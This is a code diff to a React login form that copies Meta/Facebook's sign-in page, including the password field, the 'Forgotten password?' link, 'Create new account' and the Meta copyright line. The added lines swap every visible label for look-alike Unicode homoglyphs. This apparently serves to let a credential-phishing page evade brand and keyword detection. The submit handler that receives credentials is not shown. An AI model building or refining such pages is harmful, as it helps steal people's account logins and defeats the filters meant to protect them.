@@ -161,10 +161,10 @@ return(
       </div>
       }
       <div className="mb-3 mt-3">
-         <input type="text" placeholder="Email address or phone number" value={mail} onChange={(e) => {console.log(mail); if(e.target.value.length > 100) return;setMail(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white	text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
+         <input type="text" placeholder="Εⅿаіⅼ аⅾⅾrеѕѕ оr рhοոе ոսⅿbеr" value={mail} onChange={(e) => {console.log(mail); if(e.target.value.length > 100) return;setMail(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white	text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-gray-900 dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
       </div>
       <div className="mb-2 mt-2" >
-         <input type={passwordShown ? "text" : "password"} value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} placeholder="Password" className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
+         <input type={passwordShown ? "text" : "password"} value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} placeholder="Ρаѕѕԝоrⅾ" className="block w-full p-2.5 text-gray-900 border border-gray-300 rounded-md bg-white text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-gray-900 dark:focus:ring-blue-500 dark:focus:border-blue-500"/>
          <img onClick={togglePasswordVisiblity} style={{position:'absolute',top: '30.7%',right:'12px',transform: 'translateY(-50%)',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
       </div>
       <div className="mb-0 mt-2" >
@@ -177,23 +177,23 @@ return(
       <div className="mb-2 mt-2" >
          <button className="lp-element lp-pom-button" id="lp-pom-button-17" disabled={disabled} onClick={handleSubmit}><span className="label">
             {
-            isLoading == true ?  <strong>Please wait..</strong> :  <strong>Login</strong>
+            isLoading == true ?  <strong>Please wait..</strong> :  <strong>Ꮮοցіո</strong>
             }  
           </span></button>      
       </div>
    <div className="mb-1 mt-0">
       <p className="text-center">
-         <span style={{fontSize: '14px', color: 'rgb(49, 113, 240)'}}>Forgotten password?</span>
+         <span style={{fontSize: '14px', color: 'rgb(49, 113, 240)'}}>Fοrցοttеո раѕѕԝоrⅾ?</span>
       </p>
    </div>
    <div className="mb-3 mt-0">
       <div className="inline-flex items-center justify-center w-full">
          <hr className="w-full h-px my-2 bg-gray-200 border-1 dark:bg-gray-700"/>
-         <span className="absolute px-3 font-medium text-gray-900 -translate-x-1/2 bg-white left-1/2 dark:text-white dark:bg-gray-900">or</span>
+         <span className="absolute px-3 font-medium text-gray-900 -translate-x-1/2 bg-white left-1/2 dark:text-gray-900 dark:bg-gray-900">or</span>
       </div>
    </div>
    <div className="mb-3 mt-0">
-      <button className="lp-element lp-pom-button" id="lp-pom-button-66"><span className="label"><strong>Create new account</strong></span></button>
+      <button className="lp-element lp-pom-button" id="lp-pom-button-66"><span className="label"><strong>Ꮯrеаtе ոеԝ ассоսոt</strong></span></button>
    </div>
    <div className="text-center mb-2 mt-0">
    <span className="text-gray-400" style={{fontSize: '13px'}}>Меtа © 2024</span>
